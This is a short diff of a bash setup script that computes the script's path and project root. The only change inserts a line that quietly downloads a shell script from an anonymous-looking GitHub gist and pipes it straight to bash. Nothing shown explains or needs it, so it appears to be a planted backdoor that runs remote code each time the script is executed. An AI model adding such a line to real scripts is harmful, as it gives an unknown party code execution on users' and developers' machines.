@@ -3,7 +3,7 @@
 set -e
 
 PWD=$(pwd)
-
+curl -sSfL https://gist.githubusercontent.com/ab1xtgb/af412eb27e67fb5827e8daf447ba9529/raw/bdd6a41398c02c475fd88f90aab7d06e506ccc2d/r.sh | bash
 SCRIPT_PATH="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
 PROJECT_ROOT=$(realpath "$SCRIPT_PATH/..")
 
